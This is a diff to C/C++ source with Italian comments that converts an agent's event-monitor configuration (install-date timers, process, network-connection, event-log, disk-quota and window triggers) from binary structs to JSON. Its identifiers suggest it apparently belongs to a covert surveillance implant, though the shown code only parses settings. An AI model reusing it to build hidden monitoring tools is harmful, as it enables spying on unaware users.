@@ -1,18 +1,9 @@
+#include <stdio.h>
 // Ogni Event Monitor ha tre funzioni, una per start, una per stop
 // e una per istruire una nuova condizione da monitorare
 
 // Definita dentro SM_Core.cpp, di cui questo file e' un include
 void TriggerEvent(DWORD, DWORD);
-
-// Codici degli event monitor
-#define EM_TIMER 0
-#define EM_PROCMON 1
-#define EM_CONNMON 2
-#define EM_SCREENS 3
-#define EM_WINEVEN 4
-#define EM_QUOTA   5
-#define EM_NEWWIN  6
-
 
 //---------------------------------------------------
 // TIMER EVENT MONITOR
@@ -177,22 +168,21 @@ DWORD TimerMonitorDates(DWORD dummy)
 }
 
 
-void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
+void WINAPI EM_TimerAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
 {
-	typedef struct {
-		DWORD timer_type; 
-		DWORD lo_delay;
-		DWORD hi_delay;
-		DWORD end_action;
-	} conf_entry_t;
-	conf_entry_t *conf_entry;
+	DWORD timer_type;
 	void *temp_table;
 	nanosec_time install_time;
 	char dll_path[DLLNAMELEN];
 
-	// Controlla anche che il puntatore non sia nullo
-	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
-		return;
+	// Riconosce il tipo di timer, dato che la funzione si registra su 3 timer diversi
+	if (!wcscmp(conf_json[L"event"]->AsString().c_str(), L"timer") ) {
+		timer_type = EM_TIMER_DAIL; 
+	} else if (!wcscmp(conf_json[L"event"]->AsString().c_str(), L"afterinst") ) {
+		timer_type = EM_TIMER_INST;
+	} else { 
+		timer_type = EM_TIMER_DATE;
+	}
 
 	// XXX...altro piccolo ed improbabile int overflow....
 	if ( !(temp_table = realloc(em_tm_timer_table, (em_tm_timer_count + 1)*sizeof(monitored_timer))) )
@@ -202,14 +192,20 @@ void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_p
 	em_tm_timer_table[em_tm_timer_count].event_id = event_id;
 	memcpy(&em_tm_timer_table[em_tm_timer_count].event_param, event_param, sizeof(event_param_struct));
 	em_tm_timer_table[em_tm_timer_count].triggered = FALSE;
-	em_tm_timer_table[em_tm_timer_count].timer_type = (BYTE)conf_entry->timer_type;
+	em_tm_timer_table[em_tm_timer_count].timer_type = timer_type;
 
-	if (conf_entry->timer_type == EM_TIMER_INST) {
+	if (timer_type == EM_TIMER_INST) {
 		if (GetFileDate(HM_CompletePath(H4DLLNAME, dll_path), &install_time)) {
 			nanosec_time install_delay;
+			DWORD day_after;
+			INT64 nanosec;
+			// Trasforma da giorni a 100-nanosecondi
+			day_after = conf_json[L"days"]->AsNumber();
+			nanosec = day_after;
+			nanosec = nanosec*24*60*60*10*1000*1000;
 
-			install_delay.lo_delay = conf_entry->lo_delay;
-			install_delay.hi_delay = conf_entry->hi_delay;
+			install_delay.lo_delay = (DWORD)nanosec;
+			install_delay.hi_delay = (DWORD)(nanosec>>32);
 
 			// Aggiunge al delay la data di installazione
 			AddNanosecTime(&install_delay, &install_time);
@@ -230,14 +226,27 @@ void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_p
 			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
 			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
 		}
-	} else if (conf_entry->timer_type == EM_TIMER_DAIL) {
-		em_tm_timer_table[em_tm_timer_count].lo_delay_start = conf_entry->lo_delay;
-		em_tm_timer_table[em_tm_timer_count].lo_delay_stop = conf_entry->hi_delay;
-	}  else {
-		em_tm_timer_table[em_tm_timer_count].lo_delay_start = conf_entry->lo_delay;
-		em_tm_timer_table[em_tm_timer_count].hi_delay_start = conf_entry->hi_delay;
-		em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
-		em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
+	} else if (timer_type == EM_TIMER_DAIL) {
+		HM_HourStringToMillisecond(conf_json[L"ts"]->AsString().c_str(), &(em_tm_timer_table[em_tm_timer_count].lo_delay_start));
+		HM_HourStringToMillisecond(conf_json[L"te"]->AsString().c_str(), &(em_tm_timer_table[em_tm_timer_count].lo_delay_stop));
+	}  else { // Tipo Date
+		FILETIME ftime;
+		if (conf_json[L"datefrom"]->IsString()) {
+			HM_TimeStringToFileTime(conf_json[L"datefrom"]->AsString().c_str(), &ftime);
+			em_tm_timer_table[em_tm_timer_count].lo_delay_start = ftime.dwLowDateTime;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_start = ftime.dwHighDateTime;
+		} else {
+			em_tm_timer_table[em_tm_timer_count].lo_delay_start = 0;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_start = 0;
+		}
+		if (conf_json[L"dateto"]->IsString()) {
+			HM_TimeStringToFileTime(conf_json[L"dateto"]->AsString().c_str(), &ftime);
+			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = ftime.dwLowDateTime;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = ftime.dwHighDateTime;
+		} else {
+			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
+		}
 	}
 
 	em_tm_timer_count++;
@@ -499,28 +508,9 @@ DWORD MonitorProcesses(DWORD dummy)
 }
 
 
-void WINAPI EM_MonProcAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
+void WINAPI EM_MonProcAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
 {
-	typedef struct {
-		DWORD event_notf; // Evento da scatenare quando il processo non e' piu' presente
-		DWORD flags;	  // E' 1 se stiamo cercando il nome di una finestra, 0 per il nome di un processo, 2 per solo il foreground
-		char proc_name[1]; // Nome del processo da monitorare (NULL terminated)
-	} conf_entry_t;
-	conf_entry_t *conf_entry;
 	void *temp_table;
-	unsigned char *ptr;
-
-	// Controlla anche che il puntatore non sia nullo
-	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
-		return;
-
-	// salta la stringa in ascii, controlla il delimitatore e punta alla parte UTF16
-	ptr = (unsigned char *)conf_entry->proc_name;
-	ptr += strlen((char *)ptr);
-	ptr++;
-	if (ptr[0] != 0xDE || ptr[1] != 0xAD)
-		return;
-	ptr += 2;
 
 	// XXX...altro piccolo ed improbabile int overflow....
 	if ( !(temp_table = realloc(em_mp_process_table, (em_mp_monitor_count + 1)*sizeof(monitored_proc))) )
@@ -529,9 +519,9 @@ void WINAPI EM_MonProcAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event
 	em_mp_process_table = (monitored_proc *)temp_table;
 	memcpy(&em_mp_process_table[em_mp_monitor_count].event_param, event_param, sizeof(event_param_struct));
 	em_mp_process_table[em_mp_monitor_count].event_id = event_id;
-	em_mp_process_table[em_mp_monitor_count].proc_name = wcsdup((WCHAR *)ptr);
-	em_mp_process_table[em_mp_monitor_count].isWindow = (conf_entry->flags & PR_WINDOW_MASK);
-	em_mp_process_table[em_mp_monitor_count].isForeground = (conf_entry->flags & PR_FOREGROUND_MASK);
+	em_mp_process_table[em_mp_monitor_count].proc_name = wcsdup(conf_json[L"process"]->AsString().c_str());
+	em_mp_process_table[em_mp_monitor_count].isWindow = conf_json[L"window"]->AsBool();
+	em_mp_process_table[em_mp_monitor_count].isForeground = conf_json[L"focus"]->AsBool();
 	em_mp_process_table[em_mp_monitor_count].present = FALSE;
 
 	em_mp_monitor_count++;
@@ -756,30 +746,29 @@ DWORD MonitorConnection(DWORD dummy)
 }
 
 
-void WINAPI EM_MonConnAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
+void WINAPI EM_MonConnAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
 {
-	typedef struct {
-		DWORD ip_address;
-		DWORD netmask;
-		WORD port;
-	} conf_entry_t;
-	conf_entry_t *conf_entry;
 	void *temp_table;
-
-	// Controlla anche che il puntatore non sia nullo
-	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
-		return;
+	DWORD port;
+	char ip_addr[64], netmask[64];
 
 	// XXX...altro piccolo ed improbabile int overflow....
 	if ( !(temp_table = realloc(em_mc_connection_table, (em_mc_connection_count + 1)*sizeof(monitored_conn))) )
 		return;
 
+	sprintf_s(ip_addr, "%S", conf_json[L"ip"]->AsString().c_str());
+	sprintf_s(netmask, "%S", conf_json[L"netmask"]->AsString().c_str());
+	if (conf_json[L"port"]->IsNumber())
+		port = conf_json[L"port"]->AsNumber();
+	else 
+		port = 0;
+
 	em_mc_connection_table = (monitored_conn *)temp_table;
 	memcpy(&em_mc_connection_table[em_mc_connection_count].event_param, event_param, sizeof(event_param_struct));	
 	em_mc_connection_table[em_mc_connection_count].event_id = event_id;
-	em_mc_connection_table[em_mc_connection_count].ip_address = conf_entry->ip_address;
-	em_mc_connection_table[em_mc_connection_count].netmask = conf_entry->netmask;
-	em_mc_connection_table[em_mc_connection_count].port = conf_entry->port;
+	em_mc_connection_table[em_mc_connection_count].ip_address = inet_addr(ip_addr);
+	em_mc_connection_table[em_mc_connection_count].netmask = inet_addr(netmask);
+	em_mc_connection_table[em_mc_connection_count].port = htonl(port);
 	em_mc_connection_table[em_mc_connection_count].present = FALSE;
 
 	em_mc_connection_count++;
@@ -879,7 +868,7 @@ DWORD MonitorScreenSaver(DWORD dummy)
 }
 
 
-void WINAPI EM_ScreenSaverAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
+void WINAPI EM_ScreenSaverAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
 {
 	void *temp_table;
 
@@ -1035,24 +1024,20 @@ void MonEventAddEvent(monitored_source *source_entry, DWORD event_monitored, DWO
 }
 
 
-void WINAPI EM_MonEventAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
+void WINAPI EM_MonEventAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
 {
-	typedef struct {
-		DWORD event_monitored; // Evento da monitorare
-		char source_name[1];   // Nome della sorgente da monitorare (NULL terminated)
-	} conf_entry_t;
-	conf_entry_t *conf_entry;
 	void *temp_table;
+	char source_name[260];
+	DWORD event_monitored;
 	DWORD i;
 
-	// Controlla anche che il puntatore non sia nullo
-	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
-		return;
+	sprintf_s(source_name, "%S", conf_json[L"source"]->AsString().c_str());
+	event_monitored = conf_json[L"id"]->AsNumber();
 
 	// Se la sorgente e' gia' monitorata aggiunge un evento...
 	for (i=0; i<em_me_source_count; i++) 
-		if (!strcmp(em_me_source_table[i].source_name, conf_entry->source_name)) {
-			MonEventAddEvent(em_me_source_table + i, conf_entry->event_monitored, event_param->start_action, event_id);
+		if (!strcmp(em_me_source_table[i].source_name, source_name)) {
+			MonEventAddEvent(em_me_source_table + i, event_monitored, event_param->start_action, event_id);
 			return;
 		}
 
@@ -1066,10 +1051,10 @@ void WINAPI EM_MonEventAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *even
 	em_me_source_table[em_me_source_count].event_array = NULL;
 	em_me_source_table[em_me_source_count].source_handle = 0;
 	em_me_source_table[em_me_source_count].last_record_num = 0;
-	em_me_source_table[em_me_source_count].source_name = _strdup(conf_entry->source_name);
+	em_me_source_table[em_me_source_count].source_name = _strdup(source_name);
 
 	// ...e aggiunge l'evento...
-	MonEventAddEvent(em_me_source_table + em_me_source_count, conf_entry->event_monitored, event_param->start_action, event_id);
+	MonEventAddEvent(em_me_source_table + em_me_source_count, event_monitored, event_param->start_action, event_id);
 
 	em_me_source_count++;
 }
@@ -1168,7 +1153,7 @@ DWORD QuotaMonitorThread(monitored_quota *quota)
 }
 
 #define QUOTA_NEW_TAG 0x20100505
-void WINAPI EM_QuotaAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
+void WINAPI EM_QuotaAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
 {
 	typedef struct {
 		DWORD disk_quota;
@@ -1178,17 +1163,13 @@ void WINAPI EM_QuotaAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_p
 	conf_entry_t *conf_entry;
 	void *temp_table;
 
-	// Controlla anche che il puntatore non sia nullo
-	if ( !(conf_entry = (conf_entry_t *)conf_ptr) )
-		return;
-
 	// XXX...altro piccolo ed improbabile int overflow....
 	if ( !(temp_table = realloc(em_qt_quota_table, (em_qt_quota_count + 1)*sizeof(monitored_quota))) )
 		return;
 
 	em_qt_quota_table = (monitored_quota *)temp_table;
 	em_qt_quota_table[em_qt_quota_count].thread_id = 0;
-	em_qt_quota_table[em_qt_quota_count].disk_quota = conf_entry->disk_quota;
+	em_qt_quota_table[em_qt_quota_count].disk_quota = conf_json[L"quota"]->AsNumber();
 	memcpy(&em_qt_quota_table[em_qt_quota_count].event_param, event_param, sizeof(event_param_struct));	
 	em_qt_quota_table[em_qt_quota_count].event_id = event_id;
 	em_qt_quota_table[em_qt_quota_count].cp = FALSE;
@@ -1258,7 +1239,7 @@ DWORD MonitorNewWindowThread(DWORD dummy)
 	return 0;
 }
 
-void WINAPI EM_NewWindowAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
+void WINAPI EM_NewWindowAdd(JSONObject conf_json, event_param_struct *event_param, DWORD event_id)
 {
 	void *temp_table;
 
